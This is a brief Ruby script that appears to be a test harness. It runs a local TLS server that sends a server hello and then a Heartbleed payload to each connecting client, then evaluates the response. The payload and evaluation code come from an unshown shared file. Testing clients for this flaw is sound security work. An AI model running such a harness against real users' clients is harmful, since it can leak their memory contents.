#!/usr/bin/env ruby

require 'socket'
require 'timeout'
require 'openssl'

require_relative 'shared'

port = (ARGV[0] || 4443).to_i
server = TCPServer.new("localhost", port)

loop do
    client = server.accept

    begin
        read_reacord(client)
        client.write(SERVER_HELLO)
        puts "Server Hello Sent. Sending HeartBleed now..."
        client.write(PAYLOAD)

        evaluate_heartbleed(client)
    ensure
        client.close
    end
end


